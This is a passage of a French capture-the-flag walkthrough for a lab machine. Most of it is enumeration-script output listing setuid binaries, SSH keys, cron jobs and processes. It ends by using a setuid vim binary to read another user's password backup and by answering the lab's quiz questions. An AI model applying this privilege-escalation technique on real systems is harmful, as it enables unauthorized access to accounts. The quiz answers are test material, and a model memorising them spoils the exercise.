/run/systemd/journal/stdout
/run/systemd/journal/syslog
/run/systemd/private
/run/systemd/notify
/run/lock
/tmp
/tmp/tmp.xMqMLlvggf
/tmp/lse.sh
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/tmp.NpnnlNEOlk
/var/spool/samba
/var/tmp
/var/crash
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
---
[*] fst010 Binaries with setuid bit........................................ yes!
---
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
---
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/vim.basic
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... yes!
---
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
---
[*] fst090 SSH files in home directories................................... yes!
---
-rw-rw-r-- 1 kay kay 771 Apr 23  2018 /home/kay/.ssh/authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 /home/kay/.ssh/id_rsa
-rw-r--r-- 1 kay kay 771 Apr 19  2018 /home/kay/.ssh/id_rsa.pub
---
[*] fst100 Useful binaries................................................. yes!
---
/usr/bin/curl
/usr/bin/dig
/bin/nc.openbsd
/bin/nc
/bin/netcat
/usr/bin/wget
---
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'jan' have mail?........................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'jan'....................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
---
PermitRootLogin prohibit-password
---
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
---
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
---
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/sh
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
/etc/crontab:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
/etc/cron.d/popularity-contest:SHELL=/bin/sh
/etc/cron.d/popularity-contest:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/popularity-contest:44 4 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/var/crash
/var/crash/.
---
[!] ret060 Can we write to executable paths present in cron jobs........... nope
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
---
tcp    LISTEN     0      1      ::ffff:127.0.0.1:8005                 :::*                  
---
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
---
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_event_module (shared)
 negotiation_module (shared)
 setenvif_module (shared)
 status_module (shared)
---
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
---
START      PID     USER COMMAND
04:37    15741     root sudo -S -l
04:37    15732     root sudo -S id
04:37    15713     root sudo -nS id
03:42      987     root /usr/sbin/sshd -D
03:42      984     root /usr/sbin/smbd -D
03:42      928     root /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
03:42      899     root /usr/sbin/smbd -D
03:42      882     root /usr/lib/policykit-1/polkitd --no-debug
03:42      875     root /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
03:42      854     root /usr/lib/snapd/snapd
03:42      850     root /lib/systemd/systemd-logind
03:42      844     root /usr/lib/accountsservice/accounts-daemon
03:42      832     root /usr/bin/lxcfs /var/lib/lxcfs/
03:42      825     root /usr/sbin/cron -f
03:42      823     root /usr/sbin/acpid
03:42      418     root /lib/systemd/systemd-udevd
03:42      388     root /sbin/lvmetad -f
03:42      357     root /lib/systemd/systemd-journald
03:42        1     root /sbin/init
03:42     1155     root /usr/sbin/apache2 -k start
03:42     1149     root /usr/sbin/nmbd -D
03:42     1127     root /sbin/agetty --noclear tty1 linux
03:42     1125     root /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
03:42     1040     root /usr/sbin/smbd -D
03:42     1012     root /sbin/iscsid
03:42     1011     root /sbin/iscsid
---
[*] pro030 Processes running by non-root users with shell.................. yes!
---


------ jan ------


START      PID     USER COMMAND
04:38    27498      jan sleep 1
04:38    27236      jan sleep 1
04:38    26975      jan sleep 1
04:38    26745      jan sleep 1
04:38    26485      jan sleep 1
04:37    26222      jan sleep 1
04:37    25959      jan sleep 1
04:37    25696      jan sleep 1
04:37    25433      jan sleep 1
04:37    25170      jan sleep 1
04:37    24909      jan sleep 1
04:37    24649      jan sleep 1
04:37    24389      jan sleep 1
04:37    24158      jan sleep 1
04:37    23895      jan sleep 1
04:37    23636      jan sleep 1
04:37    23635      jan sh /tmp/lse.sh -l1
04:37    23475      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *dockerenv* -exec ls -la {} ;
04:37    23472      jan sh /tmp/lse.sh -l1
04:37    23413      jan sh /tmp/lse.sh -l1
04:37    23374      jan sh /tmp/lse.sh -l1
04:37    23106      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *.htpasswd -print -exec cat {} ;
04:37    23105      jan sh /tmp/lse.sh -l1
04:37    23086      jan /usr/sbin/apache2 -M
04:37    23083      jan /bin/sh /usr/sbin/apache2ctl -M
04:37    23082      jan sh /tmp/lse.sh -l1
04:37    22844      jan sleep 0.2
04:37    22843      jan tcpdump -i lo -n
04:37    22841      jan grep -i listening on lo
04:37    22840      jan sh /tmp/lse.sh -l1
04:37    22839      jan sh /tmp/lse.sh -l1
04:37    22779      jan sort -u
04:37    22778      jan grep -Ev /dev/(null|zero|random|urandom)
04:37    22777      jan grep --color=never -hERoi /[a-z0-9_/\.\-]+ /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/crontab
04:37    22776      jan sh /tmp/lse.sh -l1
04:37    22775      jan sh /tmp/lse.sh -l1
04:37    22727      jan sh /tmp/lse.sh -l1
04:37    22658      jan sh /tmp/lse.sh -l1
04:37    22065      jan getcap -r /
04:37    22064      jan sh /tmp/lse.sh -l1
04:37    21981      jan grep -v root
04:37    21980      jan sh /tmp/lse.sh -l1
04:37    21979      jan sh /tmp/lse.sh -l1
04:37    21762      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /usr/lib -prune -o -path /usr/share -prune -o -regextype egrep -iregex .*(backup|dump|cop(y|ies)|bak|bkp)[^/]*\.(sql|tgz|tar|zip)?\.?(gz|xz|bzip2|bz2|lz|7z)? -readable -type f -exec ls -al {} ;
04:37    21761      jan sh /tmp/lse.sh -l1
04:37    21740      jan sh /tmp/lse.sh -l1
04:37    21207      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o ( -name .git -o -name .svn ) -print
04:37    21206      jan sh /tmp/lse.sh -l1
04:37    21161      jan sh /tmp/lse.sh -l1
04:37    21123      jan find /home/kay ( -name *id_dsa* -o -name *id_rsa* -o -name *id_ecdsa* -o -name *id_ed25519* -o -name known_hosts -o -name authorized_hosts -o -name authorized_keys ) -exec ls -la {} ;
04:37    21116      jan sh /tmp/lse.sh -l1
04:37    21115      jan sh /tmp/lse.sh -l1
04:37    20781      jan sh /tmp/lse.sh -l1
04:37    18959      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -perm -4000 -type f -print
04:37    18958      jan sh /tmp/lse.sh -l1
04:37    17412      jan find / -path /home/jan -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type l -user jan -print
04:37    15768      jan find / -path /home/jan -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -not -type l -writable -print
04:37    15767      jan sh /tmp/lse.sh -l1
04:37    15739      jan sh /tmp/lse.sh -l1
04:37    15730      jan sh /tmp/lse.sh -l1
04:37    15711      jan sh /tmp/lse.sh -l1
04:37    15528      jan sort -u
04:37    15527      jan tr : 
04:37    15526      jan cut -d= -f2
04:37    15525      jan tr -d "'
04:37    15524      jan grep -ERh ^ *PATH=.* /etc/
04:37    15523      jan sh /tmp/lse.sh -l1
04:37    15522      jan sh /tmp/lse.sh -l1
04:37    15470      jan sed s/^ *//g
04:37    15469      jan uniq -c
04:37    15468      jan sort -Mr
04:37    15466      jan grep -v ^START
04:37    15464      jan sed s/^ *//g
04:37    15462      jan sh /tmp/lse.sh -l1
04:37    15461      jan sleep 60
04:37    15458      jan sh /tmp/lse.sh -l1
04:37    15457      jan sh /tmp/lse.sh -l1
04:37    15428      jan sh /tmp/lse.sh -l1
04:08     1725      jan -bash
04:08     1724      jan sshd: jan@pts/0
04:08     1689      jan (sd-pam)
04:08     1688      jan /lib/systemd/systemd --user
---
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip

==================================( FINISHED )==================================

---
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip

==================================( FINISHED )==================================

```

**What is the name of the other user you found(all lower case)?**

Ici on trouve un autre utilisateur.

```bash
jan@basic2:/$ cd home/kay/
jan@basic2:/home/kay$ ls -al
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

On trouve ici un fichier qui nous interesse pass.bak  

**If you have found another user, what can you do with this information?**

Ou on trouve l'utilisateur root, il va être utilse car dans notre énumeration on a trouvé un fichier setuid exploitable.
/usr/bin/vim.basic

**What is the final password you obtain?**

```bash
jan@basic2:/home/kay$ /usr/bin/vim.basic pass.bak 
```

Ceci nous affiche le mot passe.